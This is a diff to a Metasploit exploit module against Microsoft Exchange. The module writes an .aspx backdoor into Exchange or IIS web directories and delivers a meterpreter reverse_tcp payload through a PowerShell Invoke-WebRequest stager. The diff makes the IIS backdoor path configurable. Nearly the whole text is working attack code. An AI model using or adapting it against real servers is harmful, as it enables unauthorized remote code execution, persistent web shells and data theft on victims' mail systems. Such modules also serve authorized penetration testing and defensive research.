@@ -62,7 +62,6 @@ class MetasploitModule < Msf::Exploit::Remote
           'RPORT' => 443,
           'SSL' => true,
           'PAYLOAD' => 'windows/x64/meterpreter/reverse_tcp'
-
         },
         'Platform' => ['windows'],
         'Arch' => [ARCH_CMD, ARCH_X64],
@@ -78,7 +77,7 @@ class MetasploitModule < Msf::Exploit::Remote
               'DefaultOptions' => {
                 'DisablePayloadHandler' => false,
                 'PAYLOAD' => 'windows/x64/meterpreter/reverse_tcp',
-                'CMDSTAGER::FLAVOR' => :psh_invokewebrequest
+                'CMDSTAGER::FLAVOR' => 'psh_invokewebrequest'
               }
             }
           ],
@@ -114,6 +113,7 @@ class MetasploitModule < Msf::Exploit::Remote
       OptString.new('ExchangeBasePath', [true, 'The base path where exchange is installed', 'C:\\Program Files\\Microsoft\\Exchange Server\\V15']),
       OptString.new('ExchangeWritePath', [true, 'The path where you want to write the backdoor', 'owa\\auth']),
       OptString.new('IISBasePath', [true, 'The base path where IIS wwwroot directory is', 'C:\\inetpub\\wwwroot']),
+      OptString.new('IISWritePath', [true, 'The path where you want to write the backdoor', 'aspnet_client']),
       OptString.new('MapiClientApp', [true, 'This is MAPI client version sent in the request', 'Outlook/15.0.4815.1002']),
       OptInt.new('MaxWaitLoop', [true, 'Max counter loop to wait for OAB Virtual Dir reset', 30]),
       OptString.new('UserAgent', [true, 'The HTTP User-Agent sent in the request', 'Mozilla/5.0'])
@@ -438,7 +438,7 @@ class MetasploitModule < Msf::Exploit::Remote
 
   def web_directory
     if datastore['UseAlternatePath']
-      web_dir = 'aspnet_client'
+      web_dir = datastore['IISWritePath'].gsub('\\', '/')
     else
       web_dir = datastore['ExchangeWritePath'].gsub('\\', '/')
     end
@@ -450,7 +450,7 @@ class MetasploitModule < Msf::Exploit::Remote
 
     remote_file = "#{rand_text_alpha(4..8)}.aspx"
     if datastore['UseAlternatePath']
-      remote_path = "#{datastore['IISBasePath'].split(':')[1]}\\aspnet_client"
+      remote_path = "#{datastore['IISBasePath'].split(':')[1]}\\#{datastore['IISWritePath']}"
       remote_path = "\\\\127.0.0.1\\#{datastore['IISBasePath'].split(':')[0]}$#{remote_path}\\#{remote_file}"
     else
       remote_path = "#{datastore['ExchangeBasePath'].split(':')[1]}\\FrontEnd\\HttpProxy\\#{datastore['ExchangeWritePath']}"
@@ -503,7 +503,7 @@ class MetasploitModule < Msf::Exploit::Remote
 
     print_good("Yeeting #{datastore['PAYLOAD']} payload at #{peer}")
     if datastore['UseAlternatePath']
-      remote_file = "#{datastore['IISBasePath']}\\aspnet_client\\#{@random_filename}"
+      remote_file = "#{datastore['IISBasePath']}\\#{datastore['IISWritePath']}\\#{@random_filename}"
     else
       remote_file = "#{datastore['ExchangeBasePath']}\\FrontEnd\\HttpProxy\\#{datastore['ExchangeWritePath']}\\#{@random_filename}"
     end
